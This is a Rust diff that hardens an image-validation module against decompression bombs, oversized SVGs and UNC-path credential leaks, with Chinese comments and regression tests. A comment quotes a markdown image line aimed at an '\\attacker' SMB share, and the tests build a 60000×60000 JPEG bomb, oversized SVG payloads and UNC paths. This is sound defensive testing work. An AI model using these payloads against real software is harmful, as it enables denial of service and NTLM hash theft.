@@ -209,6 +209,11 @@ pub fn sniff_image(bytes: &[u8]) -> Option<&'static str> {
 /// 必须是 `<svg`。不做完整 XML 解析——SVG 只以 `<img>` 方式显示（不执行脚本），这里要挡的
 /// 只是「把 HTML / 普通文本当图片」。
 fn looks_like_svg(bytes: &[u8]) -> bool {
+    svg_root_offset(bytes).is_some()
+}
+
+/// 根元素 `<svg` 在字节里的起点（见 [`looks_like_svg`]）；不是 SVG 返回 None。
+fn svg_root_offset(bytes: &[u8]) -> Option<usize> {
     let head = &bytes[..bytes.len().min(4096)];
     // 截断可能切在多字节字符中间：只取合法 UTF-8 的前缀。
     let text = match std::str::from_utf8(head) {
@@ -219,45 +224,148 @@ fn looks_like_svg(bytes: &[u8]) -> bool {
     loop {
         rest = rest.trim_start();
         if let Some(after) = rest.strip_prefix("<?") {
-            let Some(end) = after.find("?>") else {
-                return false;
-            };
+            let end = after.find("?>")?;
             rest = &after[end + 2..];
         } else if let Some(after) = rest.strip_prefix("<!--") {
-            let Some(end) = after.find("-->") else {
-                return false;
-            };
+            let end = after.find("-->")?;
             rest = &after[end + 3..];
         } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case("<!doctype") {
             let after = &rest[9..];
             // DOCTYPE 可能带内部子集 `[...]`：跳到子集结束后的 `>`。
             let end = match (after.find('['), after.find('>')) {
                 (Some(open), Some(close)) if open < close => {
-                    let Some(sub_end) = after[open..].find("]") else {
-                        return false;
-                    };
+                    let sub_end = after[open..].find(']')?;
                     let tail = &after[open + sub_end..];
-                    let Some(gt) = tail.find('>') else {
-                        return false;
-                    };
-                    open + sub_end + gt
+                    open + sub_end + tail.find('>')?
                 }
                 (_, Some(close)) => close,
-                _ => return false,
+                _ => return None,
             };
             rest = &after[end + 1..];
         } else {
             break;
         }
     }
-    let Some(after) = rest.strip_prefix("<svg") else {
-        return false;
-    };
+    let after = rest.strip_prefix("<svg")?;
     matches!(after.chars().next(), Some(c) if c.is_whitespace() || c == '>' || c == '/')
+        .then(|| text.len() - rest.len())
 }
 
-/// 从文件头读位图尺寸（宽, 高），不解码。读不出（SVG、少见的子格式）返回 None。
+/// SVG 单边上限（CSS 像素）。`<img>` 按固有尺寸栅格化，灯箱「原尺寸」显示时一张几百字节的
+/// SVG 写 `width="100000"` 就能让渲染进程申请数十 GB；2 万像素的边已远超任何屏幕与常见设计稿。
+pub const SVG_MAX_SIDE: f64 = 20_000.0;
+
+/// SVG 根元素上声明的尺寸：`width`/`height`（换算成 CSS 像素；百分比等相对单位不算），没写时
+/// 按 `viewBox` 的宽高（浏览器此时以它定固有尺寸与比例）。单边超过 [`SVG_MAX_SIDE`] 或面积超过
+/// [`IMAGE_MAX_PIXELS`] 拒（too_large）。读不到尺寸的放行：没有固有尺寸的 SVG 由页面按容器定大小。
+fn check_svg_size(bytes: &[u8]) -> Result<(), ImageError> {
+    let Some(start) = svg_root_offset(bytes) else {
+        return Ok(());
+    };
+    // 根元素开标签：到第一个 `>` 为止，最多看 64KB（属性再长也不是正常的 SVG）。
+    let tail = &bytes[start..bytes.len().min(start + 64 * 1024)];
+    let end = tail.iter().position(|b| *b == b'>').unwrap_or(tail.len());
+    let tag = String::from_utf8_lossy(&tail[4..end]);
+    let attrs = svg_attrs(&tag);
+    let attr = |name: &str| attrs.iter().find(|(k, _)| k == name).map(|(_, v)| v.as_str());
+    let view_box = attr("viewBox").and_then(|v| {
+        let nums = v
+            .split(|c: char| c.is_whitespace() || c == ',')
+            .filter(|s| !s.is_empty())
+            .map(|s| s.parse::<f64>().ok())
+            .collect::<Option<Vec<f64>>>()?;
+        (nums.len() == 4).then(|| (nums[2], nums[3]))
+    });
+    let width = attr("width").and_then(svg_length).or(view_box.map(|v| v.0));
+    let height = attr("height").and_then(svg_length).or(view_box.map(|v| v.1));
+    let too_big = |v: Option<f64>| v.is_some_and(|v| !v.is_finite() || v.abs() > SVG_MAX_SIDE);
+    let area_too_big = matches!((width, height), (Some(w), Some(h)) if w.abs() * h.abs() > IMAGE_MAX_PIXELS as f64);
+    if too_big(width) || too_big(height) || area_too_big {
+        let show = |v: Option<f64>| v.map_or("?".to_string(), |v| format!("{v:.0}"));
+        return Err(ImageError::new(
+            ImageErrorCode::TooLarge,
+            format!(
+                "SVG 尺寸太大（{}×{}），单边上限 {} 像素、总面积上限 1 亿像素",
+                show(width),
+                show(height),
+                SVG_MAX_SIDE
+            ),
+        ));
+    }
+    Ok(())
+}
+
+/// 开标签里的 `名=值` 属性（值带单引号或双引号）。只够读尺寸用，不是 XML 解析器。
+fn svg_attrs(tag: &str) -> Vec<(String, String)> {
+    let mut out = Vec::new();
+    let mut rest = tag;
+    loop {
+        rest = rest.trim_start_matches(|c: char| c.is_whitespace() || c == '/');
+        if rest.is_empty() {
+            return out;
+        }
+        let name_end = rest
+            .find(|c: char| c.is_whitespace() || c == '=' || c == '/')
+            .unwrap_or(rest.len());
+        let name = &rest[..name_end];
+        rest = rest[name_end..].trim_start();
+        let Some(after_eq) = rest.strip_prefix('=') else {
+            if name.is_empty() {
+                // 不认识的字符：跳过一个，免得死循环。
+                let mut chars = rest.chars();
+                chars.next();
+                rest = chars.as_str();
+            }
+            continue;
+        };
+        rest = after_eq.trim_start();
+        let Some(quote) = rest.chars().next().filter(|c| *c == '"' || *c == '\'') else {
+            let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
+            out.push((name.to_string(), rest[..end].to_string()));
+            rest = &rest[end..];
+            continue;
+        };
+        let body = &rest[1..];
+        let end = body.find(quote).unwrap_or(body.len());
+        out.push((name.to_string(), body[..end].to_string()));
+        rest = body.get(end + 1..).unwrap_or("");
+    }
+}
+
+/// SVG 长度换算成 CSS 像素（CSS 规定 1in = 96px）。百分比、无法解析的返回 None。
+fn svg_length(raw: &str) -> Option<f64> {
+    let raw = raw.trim();
+    let split = raw
+        .find(|c: char| !(c.is_ascii_digit() || matches!(c, '.' | '-' | '+' | 'e' | 'E')))
+        .unwrap_or(raw.len());
+    // `1e3px` 合法，但 `em`/`ex` 单位以 e 开头：数字部分末尾的 e 归单位。
+    let (mut num, mut unit) = raw.split_at(split);
+    if let Some(stripped) = num.strip_suffix(['e', 'E']) {
+        num = stripped;
+        unit = &raw[num.len()..];
+    }
+    let value: f64 = num.parse().ok()?;
+    let scale = match unit.trim().to_ascii_lowercase().as_str() {
+        "" | "px" => 1.0,
+        "in" => 96.0,
+        "cm" => 96.0 / 2.54,
+        "mm" => 96.0 / 25.4,
+        "q" => 96.0 / 101.6,
+        "pt" => 96.0 / 72.0,
+        "pc" => 16.0,
+        "em" | "rem" | "ex" | "ch" => 16.0,
+        _ => return None,
+    };
+    Some(value * scale)
+}
+
+/// 从文件头读位图尺寸（宽, 高），不解码。读不出（SVG、少见的子格式、截断或损坏的头、
+/// 宽或高为 0）返回 None。
 pub fn image_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
+    image_dimensions_raw(bytes).filter(|(w, h)| *w > 0 && *h > 0)
+}
+
+fn image_dimensions_raw(bytes: &[u8]) -> Option<(u32, u32)> {
     let be16 = |b: &[u8], at: usize| -> Option<u32> {
         Some(u16::from_be_bytes([*b.get(at)?, *b.get(at + 1)?]) as u32)
     };
@@ -269,7 +377,13 @@ pub fn image_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
     };
     match sniff_image(bytes)? {
         // IHDR 紧跟签名：宽高各 4 字节大端。
-        "png" => Some((be32(bytes, 16)?, be32(bytes, 20)?)),
+        // IHDR 必须是第一块（PNG 规范），宽高各 4 字节大端紧跟块类型。
+        "png" => {
+            if bytes.get(12..16)? != b"IHDR" {
+                return None;
+            }
+            Some((be32(bytes, 16)?, be32(bytes, 20)?))
+        }
         "gif" => Some((le16(bytes, 6)?, le16(bytes, 8)?)),
         "webp" => {
             let chunk = bytes.get(12..16)?;
@@ -289,25 +403,36 @@ pub fn image_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
             }
         }
         "jpg" => {
-            // 逐个跳过段，找到 SOFn（帧头）读高宽。
+            // 按 libjpeg 的 next_marker 走段：段与段之间的杂字节跳过（解码器只给个警告照常解），
+            // 填充用的连续 0xFF 跳过；找到 SOFn（帧头）读高宽。做空复现过「SOF 前插一个杂字节」
+            // 让旧实现读不出尺寸而放行 60000×60000 的图，所以这里必须和解码器一样宽容。
             let mut at = 2;
-            while at + 9 < bytes.len() {
-                if bytes[at] != 0xFF {
-                    return None;
-                }
-                let marker = bytes[at + 1];
-                if marker == 0xFF {
+            loop {
+                while *bytes.get(at)? != 0xFF {
                     at += 1;
-                    continue;
                 }
-                let len = be16(bytes, at + 2)? as usize;
-                let is_sof = matches!(marker, 0xC0..=0xCF) && !matches!(marker, 0xC4 | 0xC8 | 0xCC);
-                if is_sof {
-                    return Some((be16(bytes, at + 7)?, be16(bytes, at + 5)?));
+                while *bytes.get(at)? == 0xFF {
+                    at += 1;
                 }
-                at += 2 + len;
+                let marker = *bytes.get(at)?;
+                at += 1;
+                match marker {
+                    // 0xFF00 是数据里的转义；TEM、RSTn、SOI 没有长度字段。
+                    0x00 | 0x01 | 0xD0..=0xD8 => {}
+                    // 帧头之前就到了扫描数据或文件尾：不是能解码的 JPEG。
+                    0xD9 | 0xDA => return None,
+                    0xC0..=0xCF if !matches!(marker, 0xC4 | 0xC8 | 0xCC) => {
+                        return Some((be16(bytes, at + 5)?, be16(bytes, at + 3)?));
+                    }
+                    _ => {
+                        let len = be16(bytes, at)? as usize;
+                        if len < 2 {
+                            return None;
+                        }
+                        at += len;
+                    }
+                }
             }
-            None
         }
         _ => None,
     }
@@ -325,13 +450,22 @@ pub fn validate(bytes: &[u8]) -> Result<&'static str, ImageError> {
             "这不是图片文件（只支持 PNG、JPEG、GIF、WebP、SVG，按文件内容判断，不看扩展名）",
         ));
     };
-    if let Some((w, h)) = image_dimensions(bytes) {
-        if w as u64 * h as u64 > IMAGE_MAX_PIXELS {
-            return Err(ImageError::new(
-                ImageErrorCode::TooLarge,
-                format!("图片尺寸太大（{w}×{h}），超过 1 亿像素的上限"),
-            ));
-        }
+    if ext == "svg" {
+        check_svg_size(bytes)?;
+        return Ok(ext);
+    }
+    // 位图读不出尺寸一律拒：读不出就判断不了是不是解码炸弹，宁可不收（做空第一轮：旧实现放行）。
+    let Some((w, h)) = image_dimensions(bytes) else {
+        return Err(ImageError::new(
+            ImageErrorCode::NotImage,
+            "读不出图片尺寸（文件头损坏、被截断，或是不支持的子格式）",
+        ));
+    };
+    if w as u64 * h as u64 > IMAGE_MAX_PIXELS {
+        return Err(ImageError::new(
+            ImageErrorCode::TooLarge,
+            format!("图片尺寸太大（{w}×{h}），超过 1 亿像素的上限"),
+        ));
     }
     Ok(ext)
 }
@@ -400,8 +534,11 @@ pub fn store_file(kind: ImageKind, path: &Path) -> Result<PathBuf, ImageError> {
     store_file_in(&default_root()?, kind, path)
 }
 
-/// 读本地图片文件（带存在性与大小检查），不落盘。
+/// 读本地图片文件（带存在性与大小检查），不落盘。UNC / 设备路径在碰文件系统之前拒（见 [`is_remote_path`]）。
 pub fn read_image_file(path: &Path) -> Result<Vec<u8>, ImageError> {
+    if is_remote(path) {
+        return Err(remote_forbidden());
+    }
     let meta = std::fs::metadata(path).map_err(|_| {
         ImageError::new(
             ImageErrorCode::NotFound,
@@ -426,6 +563,61 @@ pub fn read_image_file(path: &Path) -> Result<Vec<u8>, ImageError> {
             format!("读不了文件 {}：{e}", path.display()),
         )
     })
+}
+
+/// 是不是网络共享或设备路径：`\\host\…`、`//host/…`（两个分隔符开头，含 `\\?\UNC\…`、`\\.\pipe\…`、
+/// `\\?\GLOBALROOT\…`），`file://<主机>/…`，以及 Windows 路径前缀为 UNC / VerbatimUNC / DeviceNS /
+/// Verbatim 的。唯一放行的双分隔符开头是 `\\?\C:\…`（VerbatimDisk，本机盘符）。
+///
+/// 为什么：Windows 上对 `\\host\share` 做任何文件系统调用（metadata、canonicalize、open）都会
+/// 发起 SMB 连接，并可能自动带上当前用户的 NTLM 凭据——一行 `![](\\attacker\x.png)` 或一次
+/// `send_image` 就能把哈希送出去（做空第一轮）。所以这是纯字符串判断，必须在任何文件系统访问之前做。
+pub fn is_remote_path(raw: &str) -> bool {
+    let s = raw.trim();
+    let b = s.as_bytes();
+    let sep = |c: u8| c == b'\\' || c == b'/';
+    if b.len() >= 2 && sep(b[0]) && sep(b[1]) {
+        // `\\?\C:\…`：本机盘符的长路径形式。
+        let verbatim_disk = b.len() >= 6
+            && b[2] == b'?'
+            && sep(b[3])
+            && b[4].is_ascii_alphabetic()
+            && b[5] == b':'
+            && b.get(6).is_none_or(|c| sep(*c));
+        return !verbatim_disk;
+    }
+    if s.len() >= 5 && s[..5].eq_ignore_ascii_case("file:") {
+        let rest = s[5..].trim_start_matches(['/', '\\']);
+        let slashes = s.len() - 5 - rest.len();
+        // `file://host/…`：两个斜杠后跟非空主机名（`file:///C:/…` 是三个斜杠、主机为空）。
+        if slashes == 2 && !rest.is_empty() {
+            return true;
+        }
+        if slashes >= 4 {
+            return true; // `file:////host/share`：浏览器与 url 库都当 UNC
+        }
+    }
+    #[cfg(windows)]
+    {
+        use std::path::{Component, Prefix};
+        if let Some(Component::Prefix(prefix)) = Path::new(s).components().next() {
+            return !matches!(prefix.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_));
+        }
+    }
+    false
+}
+
+/// [`is_remote_path`] 的路径版。
+pub fn is_remote(path: &Path) -> bool {
+    is_remote_path(&path.to_string_lossy())
+}
+
+/// UNC / 设备路径的统一拒绝原因。
+pub fn remote_forbidden() -> ImageError {
+    ImageError::new(
+        ImageErrorCode::Forbidden,
+        "不读取网络共享或设备路径（\\\\主机\\共享 这类）上的图片：先把图片复制到本机再发",
+    )
 }
 
 /// 工具回执里的内嵌 base64 图落进 `tool/`，返回引用路径。transcript 解析用：任何失败都返回
@@ -569,6 +761,9 @@ pub fn prune() -> Option<PruneReport> {
 /// 再比较前缀：`images/../secret`、指向外面的符号链接都会在这一步露出真身而被拒。
 /// 路径不存在返回 None。
 pub fn resolve_within(roots: &[PathBuf], path: &Path) -> Option<PathBuf> {
+    if is_remote(path) {
+        return None;
+    }
     let real = std::fs::canonicalize(path).ok()?;
     roots
         .iter()
@@ -649,6 +844,79 @@ mod tests {
         let mut jpg = vec![0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x04, 0x00, 0x00];
         jpg.extend_from_slice(&[0xFF, 0xC0, 0x00, 0x11, 0x08, 0x01, 0xE0, 0x02, 0x80, 0x03]);
         assert_eq!(image_dimensions(&jpg), Some((640, 480)));
+    }
+
+    /// 做空复现：60000×60000 的 JPEG 在 SOF 前插一个杂字节。浏览器（libjpeg 的 next_marker）
+    /// 会跳过段间杂字节照常解码，旧实现遇到非 0xFF 就放弃读尺寸、且读不出尺寸时放行。
+    #[test]
+    fn jpeg_bomb_with_junk_byte_before_sof_is_rejected() {
+        let mut jpg = vec![0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x04, 0x00, 0x00];
+        jpg.push(0x00); // 杂字节
+        // SOF0：长度 17、精度 8、高 60000、宽 60000、3 个分量。
+        jpg.extend_from_slice(&[0xFF, 0xC0, 0x00, 0x11, 0x08, 0xEA, 0x60, 0xEA, 0x60, 0x03]);
+        jpg.extend_from_slice(&[0x01, 0x22, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01]);
+        jpg.extend_from_slice(&[0xFF, 0xD9]);
+        let err = validate(&jpg).unwrap_err();
+        assert_eq!(err.code, ImageErrorCode::TooLarge, "{err:?}");
+    }
+
+    /// 位图读不出尺寸一律拒：截断的 PNG、IHDR 不在第一块的 PNG、没有 SOF 的 JPEG、
+    /// 不认识子格式的 WebP。
+    #[test]
+    fn bitmap_without_readable_dimensions_is_rejected() {
+        let code = |bytes: &[u8]| validate(bytes).map(|_| ()).unwrap_err().code;
+        assert_eq!(code(&PNG_1X1[..14]), ImageErrorCode::NotImage);
+        let mut not_ihdr = PNG_1X1.to_vec();
+        not_ihdr[12..16].copy_from_slice(b"tEXt");
+        assert_eq!(code(&not_ihdr), ImageErrorCode::NotImage);
+        assert_eq!(code(&[0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x04, 0x00, 0x00, 0xFF, 0xD9, 0, 0]), ImageErrorCode::NotImage);
+        assert_eq!(code(b"RIFF\x24\x00\x00\x00WEBPXXXX\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"), ImageErrorCode::NotImage);
+        assert_eq!(code(b"GIF89a\x01"), ImageErrorCode::NotImage);
+        // 正常的 1×1 仍收。
+        assert_eq!(validate(PNG_1X1).unwrap(), "png");
+    }
+
+    /// SVG 的 width/height/viewBox 有上限：`<img>` 按固有尺寸栅格化，灯箱原尺寸显示时
+    /// 一张几百字节的 SVG 能让渲染进程申请数 GB。
+    #[test]
+    fn svg_dimensions_are_capped() {
+        let code = |s: &str| validate(s.as_bytes()).map(|_| ()).map_err(|e| e.code);
+        assert_eq!(code(r#"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"/>"#), Ok(()));
+        assert_eq!(code(r#"<svg width="100%" height="100%" viewBox="0 0 800 600"></svg>"#), Ok(()));
+        assert_eq!(code(r#"<svg xmlns="http://www.w3.org/2000/svg"/>"#), Ok(()));
+        assert_eq!(code(r#"<svg width="100000" height="100000"/>"#), Err(ImageErrorCode::TooLarge));
+        assert_eq!(code(r#"<svg width="50000px" height="10"/>"#), Err(ImageErrorCode::TooLarge));
+        assert_eq!(code(r#"<svg width="200in" height="200in"/>"#), Err(ImageErrorCode::TooLarge));
+        // 没写 width/height 时按 viewBox 定固有尺寸。
+        assert_eq!(code(r#"<svg viewBox="0 0 90000 90000"/>"#), Err(ImageErrorCode::TooLarge));
+        assert_eq!(code("\u{feff}<?xml version=\"1.0\"?>\n<svg\n  width='12000'\n  height='12000'>"), Err(ImageErrorCode::TooLarge));
+    }
+
+    /// UNC 与设备路径在任何文件系统访问之前拒绝（Windows 上访问 `\\host\share` 会发起 SMB
+    /// 连接并可能带出 NTLM 凭据）。192.0.2.1 是文档保留地址，真去连会卡到网络超时，
+    /// 所以「远快于超时」就说明没碰文件系统。
+    #[test]
+    fn unc_paths_are_rejected_before_any_filesystem_access() {
+        let root = temp_root("unc");
+        for raw in [
+            r"\\192.0.2.1\share\a.png",
+            "//192.0.2.1/share/a.png",
+            r"\/192.0.2.1/share/a.png",
+            r"\\?\UNC\192.0.2.1\share\a.png",
+            r"\\.\pipe\meowo",
+            r"\\?\GLOBALROOT\Device\Mup\192.0.2.1\share\a.png",
+        ] {
+            let started = std::time::Instant::now();
+            assert!(is_remote_path(raw), "{raw}");
+            let err = store_file_in(&root, ImageKind::Sent, Path::new(raw)).unwrap_err();
+            assert_eq!(err.code, ImageErrorCode::Forbidden, "{raw}");
+            assert!(resolve_within(std::slice::from_ref(&root), Path::new(raw)).is_none());
+            assert!(started.elapsed() < std::time::Duration::from_millis(500), "{raw} 碰了文件系统");
+        }
+        for local in [r"C:\Users\a.png", "/home/a.png", r"\\?\C:\a.png", "relative/a.png", r"\single\a.png"] {
+            assert!(!is_remote_path(local), "{local}");
+        }
+        let _ = std::fs::remove_dir_all(&root);
     }
 
     #[test]
